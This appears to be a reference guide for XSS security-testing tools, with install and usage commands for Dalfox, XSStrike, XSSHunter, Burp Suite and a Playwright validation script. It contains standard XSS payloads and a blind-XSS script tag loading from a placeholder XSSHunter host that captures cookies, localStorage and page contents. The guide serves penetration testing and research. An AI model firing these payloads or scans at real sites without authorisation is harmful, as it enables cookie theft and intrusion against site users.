# XSS Research Tools — Setup & Comparison

## Tool Comparison

| Tool | Type | Best For | Speed | Accuracy |
|------|------|----------|-------|----------|
| DOM Invader | Browser Extension | DOM XSS tracing | Manual | Very High |
| Dalfox | CLI Scanner | Automated bulk scanning | Fast | High |
| XSStrike | Python CLI | Intelligent fuzzing | Medium | High |
| XSSHunter | OOB Platform | Blind XSS | Passive | Very High |
| Burp Suite Pro | Proxy + Scanner | Full manual + active | Manual | High |
| Playwright | Browser Automation | DOM XSS validation | Medium | Custom |

---

## DOM Invader (Recommended for DOM XSS)

**Installation:** Burp Suite BApp Store → DOM Invader

**Usage:**
1. Enable DOM Invader in the Burp browser
2. Navigate to the target
3. DOM Invader injects canary values and traces them to sinks
4. Click "Exploit" to auto-generate a working PoC

**Key features:**
- Automatic source-to-sink taint tracing
- postMessage interception and testing
- `web-messages` and `prototype pollution` modes

---

## Dalfox

**Installation:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Basic usage:**
```bash
# Single URL scan
dalfox url "https://target.com/search?q=test"

# Pipe from parameters file
cat urls.txt | dalfox pipe

# With custom headers (authenticated scan)
dalfox url "https://target.com/page?id=1" \
  --header "Cookie: session=abc123" \
  --header "Authorization: Bearer TOKEN"

# Blind XSS mode
dalfox url "https://target.com/q?s=test" \
  --blind "https://your-xsshunter-url.com"

# With mining (discover hidden parameters)
dalfox url "https://target.com/" --mining-dom --mining-dict params.txt
```

---

## XSStrike

**Installation:**
```bash
pip3 install xsstrike
# or from source:
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip3 install -r requirements.txt
```

**Usage:**
```bash
# Basic scan
python3 xsstrike.py -u "https://target.com/search?q=test"

# Crawl mode
python3 xsstrike.py -u "https://target.com" --crawl

# With POST data
python3 xsstrike.py -u "https://target.com/login" --data "user=test&pass=test"

# Fuzzer mode (all parameters)
python3 xsstrike.py -u "https://target.com/page?a=1&b=2" --fuzzer
```

---

## XSSHunter (Blind XSS)

**Hosted:** [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com)

**Self-hosted:**
```bash
git clone https://github.com/trufflesecurity/xsshunter-express
cd xsshunter-express
docker-compose up
```

**Payload format:**
```html
"><script src="https://YOUR_XSSHUNTER/UNIQUE_ID.js"></script>
```

**What it captures when triggered:**
- Full page screenshot
- DOM content
- Cookies (non-HttpOnly)
- URL, Referer, User-Agent
- localStorage content

---

## Burp Suite Setup for XSS Testing

```
1. Proxy all traffic through Burp
2. Enable "DOM Invader" in the embedded browser
3. Use Scanner → Active Scan with XSS checks enabled
4. In Repeater: manually test parameter values
5. Use Intruder to fuzz multiple payloads:
   - Load payload list from payloads/polyglots.txt
   - Grep for reflection in responses
```

---

## Playwright for DOM XSS Validation

```javascript
const { chromium } = require('playwright');

async function testDomXSS(url, payload) {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  
  // Listen for dialog (alert triggered)
  let xssTriggered = false;
  page.on('dialog', async dialog => {
    xssTriggered = true;
    console.log(`[XSS TRIGGERED] Message: ${dialog.message()}`);
    await dialog.dismiss();
  });
  
  await page.goto(url + encodeURIComponent(payload));
  await page.waitForTimeout(2000);
  
  if (xssTriggered) {
    console.log(`[VULNERABLE] ${url} with payload: ${payload}`);
  }
  
  await browser.close();
  return xssTriggered;
}

// Test a list of payloads
const payloads = [
  '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  'javascript:alert(1)'
];

(async () => {
  for (const payload of payloads) {
    await testDomXSS('https://test-target.com/search?q=', payload);
  }
})();
```
